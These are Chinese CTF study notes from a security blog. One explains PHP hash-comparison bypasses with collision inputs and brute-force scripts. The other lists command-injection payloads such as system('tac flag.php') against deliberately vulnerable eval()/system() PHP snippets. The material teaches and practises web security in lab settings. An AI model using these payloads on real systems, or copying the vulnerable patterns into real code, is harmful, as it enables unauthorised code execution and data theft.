<p>windows可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p <span class="number">123</span>.txt -o <span class="number">1</span>.txt <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="sha1碰撞："><a href="#sha1碰撞：" class="headerlink" title="sha1碰撞："></a>sha1碰撞：</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>%<span class="number">7</span>FF%DC%<span class="number">93</span>%A6%B6%<span class="number">7</span>E%<span class="number">01</span>%<span class="number">3</span>B%<span class="number">02</span>%<span class="number">9</span>A%AA%<span class="number">1</span>D%B2V%<span class="number">0</span>BE%CAg%D6%<span class="number">88</span>%C7%F8K%<span class="number">8</span>CLy%<span class="number">1</span>F%E0%<span class="number">2</span>B%<span class="number">3</span>D%F6%<span class="number">14</span>%F8m%B1i%<span class="number">09</span>%<span class="number">01</span>%C5kE%C1S%<span class="number">0</span>A%FE%DF%B7%<span class="number">608</span>%E9rr/%E7%ADr%<span class="number">8</span>F%<span class="number">0</span>EI%<span class="number">04</span>%E0F%C20W%<span class="number">0</span>F%E9%D4%<span class="number">13</span>%<span class="number">98</span>%AB%E1.%F5%BC%<span class="number">94</span>%<span class="number">2</span>B%E35B%A4%<span class="number">80</span>-%<span class="number">98</span>%B5%D7%<span class="number">0</span>F%<span class="number">2</span>A3.%C3%<span class="number">7</span>F%AC5%<span class="number">14</span>%E7M%DC%<span class="number">0</span>F%<span class="number">2</span>C%C1%A8t%CD%<span class="number">0</span>Cx0Z%<span class="number">21</span>Vda0%<span class="number">97</span>%<span class="number">89</span>%<span class="number">60</span>k%D0%BF%<span class="number">3</span>F%<span class="number">98</span>%CD%A8%<span class="number">04</span>F%<span class="number">29</span>%A1</span><br><span class="line">b=%<span class="number">25</span>PDF-<span class="number">1.3</span>%<span class="number">0</span>A%<span class="number">25</span>%E2%E3%CF%D3%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A1%<span class="number">200</span>%<span class="number">20</span>obj%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>C/Width%<span class="number">202</span>%<span class="number">200</span>%<span class="number">20</span>R/Height%<span class="number">203</span>%<span class="number">200</span>%<span class="number">20</span>R/Type%<span class="number">204</span>%<span class="number">200</span>%<span class="number">20</span>R/Subtype%<span class="number">205</span>%<span class="number">200</span>%<span class="number">20</span>R/Filter%<span class="number">206</span>%<span class="number">200</span>%<span class="number">20</span>R/ColorSpace%<span class="number">207</span>%<span class="number">200</span>%<span class="number">20</span>R/Length%<span class="number">208</span>%<span class="number">200</span>%<span class="number">20</span>R/BitsPerComponent%<span class="number">208</span>%<span class="number">3</span>E%<span class="number">3</span>E%<span class="number">0</span>Astream%<span class="number">0</span>A%FF%D8%FF%FE%<span class="number">00</span>%<span class="number">24</span>SHA-<span class="number">1</span>%<span class="number">20</span>is%<span class="number">20</span>dead%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">85</span>/%EC%<span class="number">09</span>%<span class="number">239</span>u%<span class="number">9</span>C9%B1%A1%C6%<span class="number">3</span>CL%<span class="number">97</span>%E1%FF%FE%<span class="number">01</span>sF%DC%<span class="number">91</span>f%B6%<span class="number">7</span>E%<span class="number">11</span>%<span class="number">8</span>F%<span class="number">02</span>%<span class="number">9</span>A%B6%<span class="number">21</span>%B2V%<span class="number">0</span>F%F9%CAg%CC%A8%C7%F8%<span class="number">5</span>B%A8Ly%<span class="number">03</span>%<span class="number">0</span>C%<span class="number">2</span>B%<span class="number">3</span>D%E2%<span class="number">18</span>%F8m%B3%A9%<span class="number">09</span>%<span class="number">01</span>%D5%DFE%C1O%<span class="number">26</span>%FE%DF%B3%DC8%E9j%C2/%E7%BDr%<span class="number">8</span>F%<span class="number">0</span>EE%BC%E0F%D2%<span class="number">3</span>CW%<span class="number">0</span>F%EB%<span class="number">14</span>%<span class="number">13</span>%<span class="number">98</span>%BBU.%F5%A0%A8%<span class="number">2</span>B%E31%FE%A4%<span class="number">807</span>%B8%B5%D7%<span class="number">1</span>F%<span class="number">0E3</span>.%DF%<span class="number">93</span>%AC5%<span class="number">00</span>%EBM%DC%<span class="number">0</span>D%EC%C1%A8dy%<span class="number">0</span>Cx%<span class="number">2</span>Cv%<span class="number">21</span>V%<span class="number">60</span>%DD0%<span class="number">97</span>%<span class="number">91</span>%D0k%D0%AF%<span class="number">3</span>F%<span class="number">98</span>%CD%A4%BCF%<span class="number">29</span>%B1</span><br></pre></td></tr></table></figure>

<p>‍</p>
<h1 id="实验8"><a href="#实验8" class="headerlink" title="实验8"></a>实验8</h1><p><img src="/.com//image-20250417175035-pl0a3iz.png" alt="image"></p>
<p><img src="/.com//image-20250417175038-xd91avl.png" alt="image"></p>
<p>两个SHA1值相同而SHA256的值不同的pdf文件, <a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-1.pdf">shattered-1.pdf</a>和<a target="_blank" rel="noopener" href="https://shattered.it/static/shattered-2.pdf">shattered-2.pdf</a></p>
<p>‍</p>
<h1 id="a-md5-a"><a href="#a-md5-a" class="headerlink" title="$a==md5($a)"></a>$a==md5($a)</h1><p>​<code>0e215962017</code>​的 <code>MD5</code>​ 值也是由 <code>0e</code>​ 开头，在 PHP 弱类型比较中等</p>
<p>‍</p>
<h1 id="实验9"><a href="#实验9" class="headerlink" title="实验9"></a>实验9</h1><p><img src="/.com//image-20250417175101-50g9dml.png" alt="image"></p>
<p><img src="/.com//image-20250417175105-z4p4lmw.png" alt="image"></p>
<p>‍</p>
<h1 id="NAN-和-INF"><a href="#NAN-和-INF" class="headerlink" title="NAN 和 INF"></a>NAN 和 INF</h1><p>NAN和INF，分别为非数字和无穷大，但是通过<code>var_dump</code>​查看数据类型却是double，那么在md5函数处理它们的时候，是将其直接转换为字符串<code>NAN</code>​和字符串<code>INF</code>​使用的，但是它们拥有特殊的性质，它们与任何数据类型（除了true）做强类型或弱类型比较均为false，甚至<code>NAN=NAN</code>​都是false，但<code>md5(&#39;NaN&#39;)==md5(&#39;NAN&#39;)</code>​为true。</p>
<p>‍</p>
<h1 id="实验10"><a href="#实验10" class="headerlink" title="实验10"></a>实验10</h1><p><img src="/.com//image-20250417175117-ndyibgq.png" alt="image"></p>
<p><img src="/.com//image-20250417175121-hgvnlqn.png" alt="image"></p>
<p><img src="/.com//image-20250417175124-dql4g5j.png" alt="image"></p>
<p><img src="/.com//image-20250417175127-ivcykbh.png" alt="image"></p>
<p>可以使用<code>NAN</code>​绕过<code>md5()</code>​和<code>sha1()</code>​</p>
<p>‍</p>
<h1 id="截断比较"><a href="#截断比较" class="headerlink" title="截断比较"></a>截断比较</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>),<span class="number">0</span>,<span class="number">5</span>)===<span class="string">&#x27;8ffb1&#x27;</span></span><br></pre></td></tr></table></figure>

<p>‍</p>
<h2 id="MD5截断爆破"><a href="#MD5截断爆破" class="headerlink" title="MD5截断爆破"></a>MD5截断爆破</h2><p>给出一段<code>md5</code>​值要求找到匹配的原码。一般使用爆破脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy import Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">md5</span>(ant):  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">str</span>(ant).<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;8ffb1&#x27;</span>  <span class="comment"># 已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">findmd5</span>(sss):  <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="keyword">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="keyword">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">md5</span>(i)[<span class="number">0</span>:<span class="number">5</span>] == keymd5:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&#x27;&#123;result&#125; &#123;md5(result)&#125;&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="keyword">list</span>.<span class="title function_ invoke__">append</span>(<span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="title function_ invoke__">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line"><span class="comment"># print(list)</span></span><br><span class="line">pool = <span class="title function_ invoke__">ThreadPool</span>()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="title function_ invoke__">map</span>(findmd5, <span class="keyword">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.<span class="title function_ invoke__">close</span>()</span><br><span class="line">pool.<span class="title function_ invoke__">join</span>()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175151-7xw4wjg.png" alt="image"></p>
<p>‍</p>
<h2 id="sha256截断爆破"><a href="#sha256截断爆破" class="headerlink" title="sha256截断爆破"></a>sha256截断爆破</h2><p>脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sha256截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(sha256(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sha256</span>(<span class="params">s</span>):  <span class="comment"># 计算sha256字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.sha256(<span class="string">f&#x27;TQLCTF<span class="subst">&#123;s&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keysha256 = <span class="string">&#x27;5625f&#x27;</span>  <span class="comment"># 已知的sha256截断值</span></span><br><span class="line">sha256start = <span class="number">0</span>  <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">sha256length = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">findsha256</span>(<span class="params">sss</span>):  <span class="comment"># 输入范围 里面会进行sha256测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = <span class="built_in">int</span>(key[<span class="number">0</span>])  <span class="comment"># 开始位置</span></span><br><span class="line">    end = <span class="built_in">int</span>(key[<span class="number">1</span>])  <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># print(sha256(i)[sha256start:sha256length])</span></span><br><span class="line">        <span class="keyword">if</span> sha256(i)[<span class="number">0</span>:<span class="number">5</span>] == keysha256:  <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;result&#125;</span> <span class="subst">&#123;sha256(result)&#125;</span>&#x27;</span>)  <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = []  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    <span class="built_in">list</span>.append(<span class="built_in">str</span>(<span class="number">10000000</span> * i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(<span class="number">10000000</span> * (i + <span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool()  <span class="comment"># 多线程任务</span></span><br><span class="line">pool.<span class="built_in">map</span>(findsha256, <span class="built_in">list</span>)  <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175213-75wbvwu.png" alt="image"></p>
<p>‍</p>
<h1 id="array-search和is-array"><a href="#array-search和is-array" class="headerlink" title="array_search和is_array"></a>array_search和is_array</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (!is_array($_GET[<span class="string">&#x27;test&#x27;</span>])) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$test = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($test); $i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($test[$i] === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        echo <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i] = intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (array_search(<span class="string">&quot;admin&quot;</span>, $test) === <span class="number">0</span>) &#123;</span><br><span class="line">    echo <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    echo <span class="string">&quot;failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//image-20250417175225-hxln96p.png" alt="image"></p>
<p><img src="/.com//image-20250417175228-20igd3y.png" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" data-id="cmaxy8gbh0006kg7k5sz7ec9k" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Web/RCE（远程代码执行漏洞）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/05/20/Web/RCE%EF%BC%88%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%89/" class="article-date">
  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="RCE（远程代码执行漏洞）"><a href="#RCE（远程代码执行漏洞）" class="headerlink" title="RCE（远程代码执行漏洞）"></a>RCE（远程代码执行漏洞）</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>RCE（Remote Code  Execution，远程代码执行）漏洞是指攻击者通过漏洞，能够在目标系统上远程执行任意代码的安全漏洞。这种漏洞通常允许攻击者在受害主机上执行恶意命令，可能导致系统被完全控制，甚至可能被用来执行系统级操作，如删除文件、窃取敏感数据、安装恶意软件等。<br>本文基于ctfshow命令执行部分，整理了RCE常见函数与命令。文章很长，建议配合右下角目录食用。</p>
<hr>
<h1 id="一-命令执行函数"><a href="#一-命令执行函数" class="headerlink" title="一. 命令执行函数"></a>一. 命令执行函数</h1><p>以下函数都应当在<code>eval</code>​中执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];                </span><br><span class="line">	<span class="keyword">eval</span>(<span class="variable">$c</span>);       </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="1-1-system函数命令执行"><a href="#1-1-system函数命令执行" class="headerlink" title="1.1 system函数命令执行"></a>1.1 system函数命令执行</h2><p>通过system函数执行操作系统的shell命令并输出结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">?c=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-2-passthru函数命令执行"><a href="#1-2-passthru函数命令执行" class="headerlink" title="1.2 passthru函数命令执行"></a>1.2 passthru函数命令执行</h2><p>​<code>passthru</code>​和<code>system</code>​函数差不多</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=passthru(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="1-3-echo-反引号命令执行"><a href="#1-3-echo-反引号命令执行" class="headerlink" title="1.3 echo+反引号命令执行"></a>1.3 echo+反引号命令执行</h2><p>用反引号执行shell命令，但是反引号执行完命令不会被输出，所以需要配合echo函数输出结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=echo `ls`;</span><br><span class="line">?c=echo `tac flag.php`;</span><br></pre></td></tr></table></figure>

<h2 id="1-4-shell-exec函数命令执行"><a href="#1-4-shell-exec函数命令执行" class="headerlink" title="1.4 shell_exec函数命令执行"></a>1.4 shell_exec函数命令执行</h2><p>​<code>shell_exec</code>​函数和反引号类似，只执行但不返回，需要配合<code>echo</code>​命令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=echo shell_exec(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<h1 id="二-常用命令"><a href="#二-常用命令" class="headerlink" title="二. 常用命令"></a>二. 常用命令</h1><p>以下命令应当在命令执行函数中执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    </span><br><span class="line">	<span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];    </span><br><span class="line">	<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;    </span><br><span class="line">	<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="1-0-phpinfo-测试命令执行"><a href="#1-0-phpinfo-测试命令执行" class="headerlink" title="1.0 phpinfo()测试命令执行"></a>1.0 phpinfo()测试命令执行</h2><p>​<code>phpinfo()</code>​命令被广泛应用于是否存在RCE命令执行漏洞的测试，例如检验是否成功写入了一句话木马。更加重要的是，phpinfo中<code>disable_functions</code>​项会提供被禁用的命令，对进一步的漏洞利用具有重大帮助</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phpinfo();</span><br></pre></td></tr></table></figure>

<h2 id="1-1-ls命令目录读取"><a href="#1-1-ls命令目录读取" class="headerlink" title="1.1 ls命令目录读取"></a>1.1 ls命令目录读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=ls;</span><br></pre></td></tr></table></figure>

<h2 id="1-2-cat命令文件读取"><a href="#1-2-cat命令文件读取" class="headerlink" title="1.2 cat命令文件读取"></a>1.2 cat命令文件读取</h2><p>​<code>cat</code>​不会将结果数据到页面上，要看源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=cat flag.php</span><br><span class="line">?c=/bin/cat flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-3-tac命令文件读取"><a href="#1-3-tac命令文件读取" class="headerlink" title="1.3 tac命令文件读取"></a>1.3 tac命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=tac flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-4-vi命令文件读取"><a href="#1-4-vi命令文件读取" class="headerlink" title="1.4 vi命令文件读取"></a>1.4 vi命令文件读取</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=vi flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-5-uniq命令文件读取"><a href="#1-5-uniq命令文件读取" class="headerlink" title="1.5 uniq命令文件读取"></a>1.5 uniq命令文件读取</h2><p>uniq函数的作用是删除文件重复行并输出剩余内容，可以用于文件读取。与cat一样，结果在源代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=uniq flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-6-base64命令读取文件"><a href="#1-6-base64命令读取文件" class="headerlink" title="1.6 base64命令读取文件"></a>1.6 base64命令读取文件</h2><p>base64命令可以读取flag.php并编码后输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=base64 flag.php</span><br><span class="line">?c=/bin/base64 flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-7-grep命令文件读取"><a href="#1-7-grep命令文件读取" class="headerlink" title="1.7 grep命令文件读取"></a>1.7 grep命令文件读取</h2><p>grep用于查询文件中包含某个特定字符串的行并输出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=grep <span class="string">&#x27;fla&#x27;</span> flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-8-sort命令排序输出"><a href="#1-8-sort命令排序输出" class="headerlink" title="1.8 sort命令排序输出"></a>1.8 sort命令排序输出</h2><p>sort是一个排序命令，<code>sort filename</code>​会将文件内容进行<strong>行间</strong>的排序并输出文本</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=sort flag.php</span><br></pre></td></tr></table></figure>

<h2 id="1-9-mv命令文件重命名"><a href="#1-9-mv命令文件重命名" class="headerlink" title="1.9 mv命令文件重命名"></a>1.9 mv命令文件重命名</h2><p>mv函数的作用是对文件进行重命名，通过修改后缀名为txt，可以直接在网页中访问txt文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=mv f?lg.php a.txt</span><br></pre></td></tr></table></figure>

<h2 id="1-10-cp命令文件内容复制"><a href="#1-10-cp命令文件内容复制" class="headerlink" title="1.10 cp命令文件内容复制"></a>1.10 cp命令文件内容复制</h2><p>用cp命令将flag的内容复制到<code>1.txt</code>​上，然后访问<code>/1.txt</code>​文件读取，注意使用反引号进行命令执行时，还是需要使用<code>echo</code>​</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=cp flag.php <span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line">?c=echo `cp flag.php <span class="number">1.</span>txt`;</span><br></pre></td></tr></table></figure>

